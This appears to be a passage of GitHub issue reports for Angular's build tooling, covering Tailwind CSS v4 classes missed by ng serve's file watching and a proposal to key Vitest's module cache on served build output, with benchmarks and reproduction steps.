  `addTypeToClassName`), so the declaration matches the generated class. Happy to send a PR with specs for the
  component and directive schematics.

title: Tailwind CSS v4 classes in new or moved files are not picked up by ng serve until another rebuild
body:
### Command

build

### Is this a regression?

- [ ] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

_No response_

### Description

In @angular/build 22.2.2 (and 22.2.3), src/tools/esbuild/stylesheets/stylesheet-plugin-factory.js handles PostCSS dir-dependency messages by expanding the glob with tinyglobby and adding the resulting files to watchFiles. Only files that exist at build time are watched. A file created later, or moved by renaming its folder, is never watched, so classes used only in it are not generated until something else triggers a stylesheet rebuild. esbuild has no directory/glob watch to fall back on, so the dir itself should probably be watched (or the glob re-expanded on add/unlink events).

1. Angular 22 app with Tailwind v4 via @tailwindcss/postcss; run ng serve.
2. Create src/app/foo/foo.ts using a class not used elsewhere, e.g. bg-[#123456]. It is generated.
3. Rename the folder to src/app/bar/ and edit the file to use bg-[#654321]. The class is not generated.
4. Touch src/styles.css. Now it is generated.

title: unit-test builder (Vitest): key `fsModuleCache` on the served build output instead of forcing it off
body:
### Command

test

### Is this a regression?

- [ ] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

_No response_

### Description

Since f0a74e8f0 (released in 22.2.3), `@angular/build:unit-test` forces `fsModuleCache: false`, at the root and on the test project, overriding the `runnerConfig`. The reason is sound: Vitest keys its file system module cache on the file found on disk, while a test entry point is served from its bundle, which also holds the application code the spec imports. Changing an imported file without touching the spec left the key unchanged, and the cache served a stale bundle.

Vitest provides a hook for exactly this case: a plugin can add its own part to the cache key with `defineCacheKeyGenerator`, from `configureVitest`. The `angular:test-in-memory-provider` plugin already implements `configureVitest` and holds `buildResultFiles`, the files its `load()` serves, each with a content hash. Keying the cache on the served build output (the output file hash plus its source map hash) removes the staleness at its root, so the cache does not need to be turned off.

Since #34337 (also in 22.2.3) the test bundles are byte-identical from one build to the next, so such a key is stable and the cache can be reused across runs and CI pipelines.

Measured on a workspace application with 255 spec files (warm Angular cache, macOS, runs alternated on an idle machine), the builder patched as described:

| builder | Vitest duration | `ng test` wall time |
|---|---|---|
| 22.2.3 (cache forced off) | 21.4 s, 21.4 s | 36.6 s, 37.9 s |
| patched, warm `fsModuleCache` | 20.0 s, 18.4 s | 35.8 s, 35.8 s |

The gain is modest here, since execution dominates this suite; it grows with the share of transform time. On the same workspace, changing a file imported by a spec (without touching the spec) makes that spec fail as expected, and reverting the change reuses the original cache entry.

I have a fix ready and will open a PR referencing this issue.

### Minimal Reproduction

1. In a project using `@angular/build:unit-test` with Vitest 5, set `fsModuleCache: true` and `fsModuleCachePath: './.vitest-cache'` in the `runnerConfig`.
2. Run `ng test --no-watch`.
3. No `.vitest-cache` directory is created: the builder overrides the option.

### Exception or Error

_No response_

### Your Environment

```text

Node.js           : 24.21.0
```
